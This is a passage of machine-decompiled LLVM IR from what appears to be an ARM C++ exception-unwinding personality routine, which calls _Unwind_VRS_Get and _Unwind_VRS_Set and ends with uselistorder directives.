  br i1 %v2_1745c, label %bb157, label %dec_label_pc_17468

bb157:                                            ; preds = %dec_label_pc_17458
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174d8

dec_label_pc_17468:                               ; preds = %dec_label_pc_17458
  %v2_17468 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_17468, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_17478 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17478, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_17480 = call i32 @_Unwind_VRS_Get(i32 %v0_17478, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_17484 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_17478, i32* %r0.global-to-local, align 4
  %v5_17498 = call i32 @_Unwind_VRS_Set(i32 %v0_17478, i32 %v0_17484, i32 14, i32 %v0_17484, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17498, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r2.global-to-local, align 4
  %v4_174a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 32) to i32*), align 4
  %v0_174a8 = load i32, i32* %r5.global-to-local, align 4
  %v0_174ac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_174ac, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_174a4, i32* %stack_var_-48, align 4
  %v5_174c0 = call i32 @_Unwind_VRS_Set(i32 %v0_174ac, i32 %v0_174a8, i32 15, i32 %v0_174a8, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174d8

dec_label_pc_174cc:                               ; preds = %dec_label_pc_17418
  %v7_174cc = icmp eq i32 %v4_1740c, 2
  br i1 %v7_174cc, label %dec_label_pc_174e4, label %dec_label_pc_174d4

dec_label_pc_174d4:                               ; preds = %dec_label_pc_174cc, %dec_label_pc_175b8, %dec_label_pc_17444, %dec_label_pc_177ac
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174d8

dec_label_pc_174d8:                               ; preds = %bb157, %dec_label_pc_177e4, %dec_label_pc_17774, %bb166, %dec_label_pc_17468, %dec_label_pc_174d4
  %v1_174e0 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_177e4 ], [ %v1_174e0.pre, %dec_label_pc_17774 ], [ 7, %bb166 ], [ 7, %dec_label_pc_17468 ], [ 9, %dec_label_pc_174d4 ]
  store i32 %v3_172f4, i32* %r4.global-to-local, align 4
  store i32 %v6_172f4, i32* %r5.global-to-local, align 4
  ret i32 %v1_174e0

dec_label_pc_174e4:                               ; preds = %dec_label_pc_174cc
  store i32 %v1_17324, i32* %r2.global-to-local, align 4
  %v0_174e8 = load i32, i32* @r7, align 4
  %v1_174e8 = inttoptr i32 %v0_174e8 to i32*
  %v2_174e8 = load i32, i32* %v1_174e8, align 4
  %tmp206 = bitcast i32 %v2_174e8 to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_174f0 = bitcast float %tmp207 to i32
  store i32 %v1_174f0, i32* @sl, align 4
  br i1 %v2_17420, label %dec_label_pc_174f8, label %dec_label_pc_17664

dec_label_pc_174f8:                               ; preds = %dec_label_pc_174e4
  %v2_174f8 = icmp eq i32 %v0_175b0, 0
  br i1 %v2_174f8, label %dec_label_pc_1764c, label %dec_label_pc_17500

dec_label_pc_17500:                               ; preds = %dec_label_pc_174f8
  %v2_17504 = icmp eq i32 %v1_174f0, 0
  br i1 %v2_17504, label %dec_label_pc_17510.thread, label %bb159

dec_label_pc_17510.thread:                        ; preds = %dec_label_pc_17500
  br label %dec_label_pc_17774

bb159:                                            ; preds = %dec_label_pc_17500
  br i1 %v3_17508, label %dec_label_pc_17518, label %dec_label_pc_1764c

dec_label_pc_17518:                               ; preds = %bb159
  %v1_17518 = add i32 %v0_174e8, 4
  store i32 %v1_17518, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_17528 = load i32, i32* @r8, align 4
  %v1_17528 = add i32 %v0_17528, 88
  store i32 %v1_17528, i32* %sb.global-to-local, align 4
  store i32 %v1_17518, i32* @r4, align 4
  br label %dec_label_pc_1754c

dec_label_pc_1753c:                               ; preds = %bb161
  %v1_1753c = add i32 %v0_1753c, 1
  store i32 %v1_1753c, i32* @r5, align 4
  %v1_17540 = load i32, i32* @sl, align 4
  %v9_17540 = icmp eq i32 %v1_1753c, %v1_17540
  %v0_17544 = load i32, i32* @r4, align 4
  %v1_17544 = add i32 %v0_17544, 4
  store i32 %v1_17544, i32* @r4, align 4
  br i1 %v9_17540, label %dec_label_pc_17774, label %dec_label_pc_1753c.dec_label_pc_1754c_crit_edge

dec_label_pc_1753c.dec_label_pc_1754c_crit_edge:  ; preds = %dec_label_pc_1753c
  %v0_17558.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1754c

dec_label_pc_1754c:                               ; preds = %dec_label_pc_1753c.dec_label_pc_1754c_crit_edge, %dec_label_pc_17518
  %v0_17558 = phi i32 [ %v0_17558.pre, %dec_label_pc_1753c.dec_label_pc_1754c_crit_edge ], [ %v1_17528, %dec_label_pc_17518 ]
  %v1_1755c = phi i32 [ %v1_17544, %dec_label_pc_1753c.dec_label_pc_1754c_crit_edge ], [ %v1_17518, %dec_label_pc_17518 ]
  %v1_1754c = inttoptr i32 %v1_1755c to i32*
  %v2_1754c = load i32, i32* %v1_1754c, align 4
  %v2_17550 = icmp eq i32 %v2_1754c, 0
  store i32 %v0_17558, i32* %forced_unwind_-44, align 4
  br i1 %v2_17550, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_1754c
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_1754c, %bb160
  %v0_17560 = load i32, i32* @r8, align 4
  store i32 %v0_17560, i32* %r0.global-to-local, align 4
  store i32 %v2_175ec, i32* %r2.global-to-local, align 4
  %v4_17570 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 100) to i32*), align 4
  store i32 95612, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17570)
  %v0_1757c = load i32, i32* %r0.global-to-local, align 4
  %v2_1757c = icmp eq i32 %v0_1757c, 0
  %v0_1753c = load i32, i32* @r5, align 4
  br i1 %v2_1757c, label %dec_label_pc_1753c, label %dec_label_pc_17584

dec_label_pc_17584:                               ; preds = %bb161
  %v1_17584 = load i32, i32* @sl, align 4
  %v9_17584 = icmp eq i32 %v0_1753c, %v1_17584
  br i1 %v9_17584, label %dec_label_pc_17774, label %dec_label_pc_1758c

dec_label_pc_1758c:                               ; preds = %dec_label_pc_17584
  %v0_1758c = load i32, i32* @r7, align 4
  %v1_1758c = inttoptr i32 %v0_1758c to i32*
  %v2_1758c = load i32, i32* %v1_1758c, align 4
  %v1_17590 = icmp slt i32 %v2_1758c, 0
  %v0_17598.pre = load i32, i32* @r6, align 4
  br i1 %v1_17590, label %dec_label_pc_17598, label %dec_label_pc_17658

dec_label_pc_17598:                               ; preds = %dec_label_pc_1758c, %dec_label_pc_17650
  %v0_17598 = phi i32 [ %storemerge, %dec_label_pc_17650 ], [ %v0_17598.pre, %dec_label_pc_1758c ]
  store i32 %v0_17598, i32* %r0.global-to-local, align 4
  %v1_1759c = add i32 %v0_17598, 4
  store i32 %v1_1759c, i32* @r6, align 4
  br label %dec_label_pc_17658

dec_label_pc_175a4:                               ; preds = %bb154
  store i32 %v1_17324, i32* %r2.global-to-local, align 4
  br i1 %v2_17420, label %dec_label_pc_175b0, label %dec_label_pc_1769c

dec_label_pc_175b0:                               ; preds = %dec_label_pc_175a4
  %v2_175b0 = icmp eq i32 %v0_175b0, 0
  br i1 %v2_175b0, label %dec_label_pc_1761c, label %dec_label_pc_175b8

dec_label_pc_175b8:                               ; preds = %dec_label_pc_175b0
  %v0_175b8 = load i32, i32* @r7, align 4
  %v1_175b8 = add i32 %v0_175b8, 4
  %v2_175b8 = inttoptr i32 %v1_175b8 to i32*
  %v3_175b8 = load i32, i32* %v2_175b8, align 4
  %v7_175bc = icmp eq i32 %v3_175b8, -2
  store i32 %v1_175b8, i32* %r2.global-to-local, align 4
  br i1 %v7_175bc, label %dec_label_pc_174d4, label %dec_label_pc_175c8

dec_label_pc_175c8:                               ; preds = %dec_label_pc_175b8
  %v0_175c8 = load i32, i32* @r8, align 4
  %v1_175c8 = add i32 %v0_175c8, 88
  %v7_175cc = icmp eq i32 %v3_175b8, -1
  store i32 %v1_175c8, i32* %forced_unwind_-44, align 4
  br i1 %v7_175cc, label %dec_label_pc_17610, label %dec_label_pc_175d8

dec_label_pc_175d8:                               ; preds = %dec_label_pc_175c8
  %v2_175dc = icmp eq i32 %v3_175b8, 0
  br i1 %v2_175dc, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_175d8
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_175d8, %bb162
  store i32 %v0_175c8, i32* %r0.global-to-local, align 4
  store i32 %v2_175ec, i32* %r2.global-to-local, align 4
  %v4_175f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 100) to i32*), align 4
  store i32 95748, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_175f8)
  %v0_17604 = load i32, i32* %r0.global-to-local, align 4
  %v2_17604 = icmp eq i32 %v0_17604, 0
  br i1 %v2_17604, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_17610.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_17610

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_1761c

dec_label_pc_17610:                               ; preds = %.thread25, %dec_label_pc_175c8
  %v3_17610 = phi i32 [ %v3_17610.pr, %.thread25 ], [ %v1_175c8, %dec_label_pc_175c8 ]
  %v2_17614 = icmp eq i32 %v3_17610, 0
  br i1 %v2_17614, label %dec_label_pc_1761c, label %dec_label_pc_17774

dec_label_pc_1761c:                               ; preds = %bb164, %dec_label_pc_176c8, %dec_label_pc_1769c, %dec_label_pc_17610, %dec_label_pc_175b0
  %v0_1761c = load i32, i32* @r7, align 4
  %v1_1761c = add i32 %v0_1761c, 8
  %v1_17384 = inttoptr i32 %v1_1761c to i32*
  %v2_17384 = load i32, i32* %v1_17384, align 4
  %v2_17388 = icmp eq i32 %v2_17384, 0
  br i1 %v2_17388, label %dec_label_pc_17444, label %dec_label_pc_17390.preheader

dec_label_pc_17624:                               ; preds = %entry
  %v3_17624 = udiv i32 %v2_17318, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_17634 = mul nuw nsw i32 %v3_17624, 4
  %v3_17638 = mul i32 %v2_17318, 65536
  %v2_1763c = add i32 %v6_17634, %v4_17318
  store i32 %v3_17638, i32* %v4_17338, align 8
  br label %dec_label_pc_17360

dec_label_pc_1764c:                               ; preds = %bb159, %dec_label_pc_174f8
  %v1_1764c = add i32 %v0_174e8, 4
  br label %dec_label_pc_17650

dec_label_pc_17650:                               ; preds = %dec_label_pc_17690, %dec_label_pc_1764c
  %v0_17650 = phi i32 [ %v2_17690, %dec_label_pc_17690 ], [ %v2_174e8, %dec_label_pc_1764c ]
  %storemerge = phi i32 [ %v4_17690, %dec_label_pc_17690 ], [ %v1_1764c, %dec_label_pc_1764c ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_17650 = icmp slt i32 %v0_17650, 0
  br i1 %v1_17650, label %dec_label_pc_17598, label %dec_label_pc_17658

dec_label_pc_17658:                               ; preds = %dec_label_pc_1758c, %dec_label_pc_17650, %dec_label_pc_17764, %dec_label_pc_17598
  %v0_1765c = phi i32 [ %v1_1759c, %dec_label_pc_17598 ], [ %storemerge, %dec_label_pc_17650 ], [ %v1_17768, %dec_label_pc_17764 ], [ %v0_17598.pre, %dec_label_pc_1758c ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_17598 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_17650 ], [ %v1_17764, %dec_label_pc_17764 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1758c ]
  %v0_17658 = load i32, i32* @sl, align 4
  %v3_17658 = mul i32 %v0_17658, 4
  %v2_1765c = add i32 %v3_17658, %v0_1765c
  %v1_1738465 = inttoptr i32 %v2_1765c to i32*
  %v2_1738466 = load i32, i32* %v1_1738465, align 4
  %v2_1738868 = icmp eq i32 %v2_1738466, 0
  br i1 %v2_1738868, label %dec_label_pc_17444, label %dec_label_pc_17390.preheader.lr.ph

dec_label_pc_17664:                               ; preds = %dec_label_pc_174e4
  %v0_17674 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17674, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_1767c = load i32, i32* @r8, align 4
  %v1_1767c = add i32 %v0_1767c, 32
  %v2_1767c = inttoptr i32 %v1_1767c to i32*
  %v3_1767c = load i32, i32* %v2_1767c, align 4
  store i32 %v3_1767c, i32* @r4, align 4
  %v5_17680 = call i32 @_Unwind_VRS_Get(i32 %v0_17674, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17680, i32* %r0.global-to-local, align 4
  %v3_17684 = load i32, i32* %stack_var_-48, align 4
  %v0_17688 = load i32, i32* @r4, align 4
  %v9_17688 = icmp eq i32 %v0_17688, %v3_17684
  br i1 %v9_17688, label %dec_label_pc_17730, label %dec_label_pc_17664.dec_label_pc_17690_crit_edge

dec_label_pc_17664.dec_label_pc_17690_crit_edge:  ; preds = %dec_label_pc_17664
  %v0_17690.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17690

dec_label_pc_17690:                               ; preds = %dec_label_pc_17664.dec_label_pc_17690_crit_edge, %dec_label_pc_17730
  %v0_17690 = phi i32 [ %v0_17690.pre, %dec_label_pc_17664.dec_label_pc_17690_crit_edge ], [ %v1_17734, %dec_label_pc_17730 ]
  %v1_17690 = inttoptr i32 %v0_17690 to i32*
  %v2_17690 = load i32, i32* %v1_17690, align 4
  %v4_17690 = add i32 %v0_17690, 4
  store i32 %v4_17690, i32* @r7, align 4
  br label %dec_label_pc_17650

dec_label_pc_1769c:                               ; preds = %dec_label_pc_175a4
  %v0_176ac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_176ac, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_176b4 = load i32, i32* @r8, align 4
  %v1_176b4 = add i32 %v0_176b4, 32
  %v2_176b4 = inttoptr i32 %v1_176b4 to i32*
  %v3_176b4 = load i32, i32* %v2_176b4, align 4
  store i32 %v3_176b4, i32* @r4, align 4
  %v5_176b8 = call i32 @_Unwind_VRS_Get(i32 %v0_176ac, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_176b8, i32* %r0.global-to-local, align 4
  %v3_176bc = load i32, i32* %stack_var_-48, align 4
  %v0_176c0 = load i32, i32* @r4, align 4
  %v9_176c0 = icmp eq i32 %v0_176c0, %v3_176bc
  br i1 %v9_176c0, label %dec_label_pc_176c8, label %dec_label_pc_1761c

dec_label_pc_176c8:                               ; preds = %dec_label_pc_1769c
  %v0_176c8 = load i32, i32* @r8, align 4
  %v1_176c8 = add i32 %v0_176c8, 40
  %v2_176c8 = inttoptr i32 %v1_176c8 to i32*
  %v3_176c8 = load i32, i32* %v2_176c8, align 4
  %v1_176cc = load i32, i32* @r7, align 4
  %v9_176cc = icmp eq i32 %v3_176c8, %v1_176cc
  br i1 %v9_176cc, label %dec_label_pc_176d4, label %dec_label_pc_1761c

dec_label_pc_176d4:                               ; preds = %dec_label_pc_176c8
  %v1_176d4 = inttoptr i32 %v3_176c8 to i32*
  %v2_176d4 = load i32, i32* %v1_176d4, align 4
  %v1_176d8 = and i32 %v2_176d4, 1073741824
  %v2_176d8 = icmp eq i32 %v1_176d8, 0
  br i1 %v2_176d8, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_176d4
  %v2_176dc = or i32 %v2_176d4, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_176d4
  %tmp208 = bitcast i32 %v2_176d4 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_176e0 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_176e4 = phi i32 [ %v2_17814, %.thread28 ], [ %v2_17814, %bb169 ], [ %v3_176c8, %bb165 ], [ %v3_176c8, %.thread26 ]
  %v0_176e4 = phi i32 [ %v2_17824, %.thread28 ], [ %v2_17820, %bb169 ], [ %v2_176dc, %bb165 ], [ %v2_176e0, %.thread26 ]
  %v2_176e4 = add i32 %v0_176e4, %v1_176e4
  store i32 %v2_176e4, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_176fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_176fc, i32* %r0.global-to-local, align 4
  %v5_17704 = call i32 @_Unwind_VRS_Set(i32 %v0_176fc, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_176fc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1771c = load i32, i32* @r8, align 4
  store i32 %v0_1771c, i32* %stack_var_-48, align 4
  %v5_17724 = call i32 @_Unwind_VRS_Set(i32 %v0_176fc, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174d8

dec_label_pc_17730:                               ; preds = %dec_label_pc_17664
  %v0_17730 = load i32, i32* @r8, align 4
  %v1_17730 = add i32 %v0_17730, 40
  %v2_17730 = inttoptr i32 %v1_17730 to i32*
  %v3_17730 = load i32, i32* %v2_17730, align 4
  %v1_17734 = load i32, i32* @r7, align 4
  %v9_17734 = icmp eq i32 %v3_17730, %v1_17734
  br i1 %v9_17734, label %dec_label_pc_1773c, label %dec_label_pc_17690

dec_label_pc_1773c:                               ; preds = %dec_label_pc_17730
  %v1_17740 = add i32 %v3_17730, 4
  store i32 %v1_17740, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_17748 = add i32 %v0_17730, 44
  %v3_17748 = inttoptr i32 %v2_17748 to i32*
  store i32 0, i32* %v3_17748, align 4
  %v0_1774c = load i32, i32* %r2.global-to-local, align 4
  %v1_1774c = load i32, i32* @r8, align 4
  %v2_1774c = add i32 %v1_1774c, 48
  %v3_1774c = inttoptr i32 %v2_1774c to i32*
  store i32 %v0_1774c, i32* %v3_1774c, align 4
  %v0_17750 = load i32, i32* @sl, align 4
  %v1_17750 = load i32, i32* @r8, align 4
  %v2_17750 = add i32 %v1_17750, 40
  %v3_17750 = inttoptr i32 %v2_17750 to i32*
  store i32 %v0_17750, i32* %v3_17750, align 4
  %v0_17754 = load i32, i32* %r0.global-to-local, align 4
  %v1_17754 = load i32, i32* @r8, align 4
  %v2_17754 = add i32 %v1_17754, 52
  %v3_17754 = inttoptr i32 %v2_17754 to i32*
  store i32 %v0_17754, i32* %v3_17754, align 4
  %v0_17758 = load i32, i32* @r7, align 4
  %v1_17758 = inttoptr i32 %v0_17758 to i32*
  %v2_17758 = load i32, i32* %v1_17758, align 4
  %v1_1775c = icmp slt i32 %v2_17758, 0
  br i1 %v1_1775c, label %dec_label_pc_17764, label %dec_label_pc_17810

dec_label_pc_17764:                               ; preds = %dec_label_pc_1773c
  %v0_17764 = load i32, i32* %r2.global-to-local, align 4
  %v1_17764 = add i32 %v0_17764, -3
  store i32 %v1_17764, i32* %r2.global-to-local, align 4
  %v0_17768 = load i32, i32* %r0.global-to-local, align 4
  %v1_17768 = add i32 %v0_17768, 4
  store i32 %v1_17768, i32* @r6, align 4
  br label %dec_label_pc_17658

dec_label_pc_17774:                               ; preds = %dec_label_pc_17584, %dec_label_pc_17610, %dec_label_pc_1753c, %dec_label_pc_17510.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_17784 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17784, i32* %r0.global-to-local, align 4
  %v5_1778c = call i32 @_Unwind_VRS_Get(i32 %v0_17784, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_17790 = load i32, i32* @r7, align 4
  %v1_17790 = load i32, i32* @r8, align 4
  %v2_17790 = add i32 %v1_17790, 40
  %v3_17790 = inttoptr i32 %v2_17790 to i32*
  store i32 %v0_17790, i32* %v3_17790, align 4
  %v3_17794 = load i32, i32* %stack_var_-48, align 4
  %v3_17798 = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_17798, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_177a0 = load i32, i32* @r8, align 4
  %v2_177a0 = add i32 %v1_177a0, 32
  %v3_177a0 = inttoptr i32 %v2_177a0 to i32*
  store i32 %v3_17794, i32* %v3_177a0, align 4
  %v0_177a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_177a4 = load i32, i32* @r8, align 4
  %v2_177a4 = add i32 %v1_177a4, 36
  %v3_177a4 = inttoptr i32 %v2_177a4 to i32*
  store i32 %v0_177a4, i32* %v3_177a4, align 4
  %v1_174e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174d8

dec_label_pc_177ac:                               ; preds = %bb155
  %v1_177ac = inttoptr i32 %v0_17434 to i32*
  %v2_177ac = load i32, i32* %v1_177ac, align 4
  %v1_177b0 = add i32 %v0_17434, 4
  %v1_177b4 = and i32 %v2_177ac, 1073741824
  %v2_177b4 = icmp eq i32 %v1_177b4, 0
  %v2_177b8 = or i32 %v2_177ac, -2147483648
  %tmp210 = bitcast i32 %v2_177ac to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_177bc = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_177b4, i32 %v2_177bc, i32 %v2_177b8
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_177c0 = load i32, i32* @r8, align 4
  %v2_177c0 = add i32 %v1_177c0, 56
  %v3_177c0 = inttoptr i32 %v2_177c0 to i32*
  store i32 %v1_177b0, i32* %v3_177c0, align 4
  %v0_177c4 = load i32, i32* @r8, align 4
  store i32 %v0_177c4, i32* %r0.global-to-local, align 4
  %v4_177d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 28) to i32*), align 4
  store i32 96220, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_177d0)
  %v0_177dc = load i32, i32* %r0.global-to-local, align 4
  %v2_177dc = icmp eq i32 %v0_177dc, 0
  br i1 %v2_177dc, label %dec_label_pc_174d4, label %dec_label_pc_177e4

dec_label_pc_177e4:                               ; preds = %dec_label_pc_177ac
  %v0_177e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_177e4 = load i32, i32* @r7, align 4
  %v2_177e4 = add i32 %v1_177e4, %v0_177e4
  store i32 %v2_177e4, i32* %stack_var_-48, align 4
  %v0_177f4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_177f4, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_17804 = call i32 @_Unwind_VRS_Set(i32 %v0_177f4, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174d8

dec_label_pc_17810:                               ; preds = %dec_label_pc_1773c
  %v0_17810 = load i32, i32* @sl, align 4
  %v3_17810 = mul i32 %v0_17810, 4
  %v0_17814 = load i32, i32* %r0.global-to-local, align 4
  %v2_17814 = add i32 %v0_17814, %v3_17810
  %v3_17814 = inttoptr i32 %v2_17814 to i32*
  %v4_17814 = load i32, i32* %v3_17814, align 4
  %v1_17818 = and i32 %v4_17814, 1073741824
  %v2_17818 = icmp eq i32 %v1_17818, 0
  br i1 %v2_17818, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_17810
  %v2_17820 = or i32 %v4_17814, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_17810
  %tmp212 = bitcast i32 %v4_17814 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_17824 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_17814, { 2, 1, 0 }
  uselistorder i32 %v1_17768, { 1, 0 }
  uselistorder i32 %v1_17764, { 1, 0 }
  uselistorder i32 %v1_17734, { 1, 0 }
  uselistorder i32 %v0_176fc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_176c8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_17690, { 1, 0 }
  uselistorder i32 %v0_17690, { 1, 0 }
  uselistorder i32 %v2_1738466, { 1, 0 }
  uselistorder i32 %v2_1765c, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_17384, { 1, 0 }
  uselistorder i32 %v1_1761c, { 1, 0 }
  uselistorder i32 %v3_175b8, { 2, 0, 1 }
  uselistorder i32 %v0_17598, { 1, 0 }
  uselistorder i32 %v0_17598.pre, { 1, 0 }
  uselistorder i32 %v1_174f0, { 1, 0 }
  uselistorder i32 %v2_174e8, { 1, 0 }
  uselistorder i32 %v0_17478, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_17438, { 1, 0 }
  uselistorder i32 %v1_17434, { 1, 0 }
  uselistorder i32 %v0_17434, { 1, 0, 2 }
  uselistorder i32 %v4_1740c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_175b0, { 1, 2, 0 }
  uselistorder i32 %v0_173e4, { 1, 0 }
  uselistorder i32 %v3_173e0, { 1, 0, 2 }
  uselistorder i32 %v1_173b4, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_175ec, { 1, 0 }
  uselistorder i1 %v2_17420, { 1, 0, 2 }
  uselistorder i32 %v1_17324, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 70, 0, 13, 14, 68, 4, 29, 30, 15, 25, 16, 26, 17, 27, 18, 28, 2, 31, 19, 32, 1, 33, 34, 35, 5, 36, 37, 38, 39, 6, 40, 41, 42, 43, 7, 44, 8, 45, 46, 20, 47, 9, 48, 49, 50, 21, 51, 10, 52, 53, 22, 54, 55, 56, 57, 58, 23, 59, 11, 60, 61, 62, 63, 64, 65, 24, 66, 12, 67, 3, 69 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 15, 8, 4, 2, 5, 12, 13, 9, 10, 11, 14, 18, 19, 3, 20, 0, 21, 22, 6, 7, 16, 17 }
  uselistorder i32 48, { 15, 2, 8, 9, 3, 4, 0, 7, 5, 6, 10, 12, 13, 14, 11, 1 }
  uselistorder i32 44, { 39, 13, 2, 40, 41, 0, 12, 3, 4, 5, 6, 7, 8, 21, 22, 23, 24, 25, 26, 18, 19, 20, 9, 27, 28, 10, 1, 11, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 14, 15, 16, 17 }
  uselistorder i32 -2147483648, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder i32 1073741824, { 4, 5, 6, 7, 8, 9, 10, 11, 1, 2, 0, 3 }
  uselistorder i32 65536, { 4, 5, 6, 7, 8, 10, 9, 15, 11, 16, 12, 17, 13, 18, 14, 19, 20, 21, 25, 22, 26, 23, 27, 24, 28, 144, 145, 143, 148, 29, 30, 31, 32, 33, 34, 142, 35, 36, 37, 2, 38, 0, 3, 39, 40, 42, 41, 1, 45, 43, 44, 46, 52, 47, 53, 48, 54, 49, 50, 51, 56, 57, 58, 59, 55, 141, 61, 60, 63, 62, 65, 66, 67, 64, 70, 68, 69, 72, 73, 74, 71, 75, 76, 78, 77, 80, 81, 79, 82, 146, 83, 86, 84, 87, 85, 89, 90, 91, 88, 92, 97, 93, 98, 94, 99, 95, 96, 101, 102, 103, 100, 104, 147, 105, 106, 107, 109, 108, 110, 118, 111, 119, 112, 120, 113, 121, 114, 122, 115, 116, 117, 124, 125, 126, 127, 123, 128, 133, 129, 134, 130, 131, 132, 136, 138, 139, 140, 135, 137 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
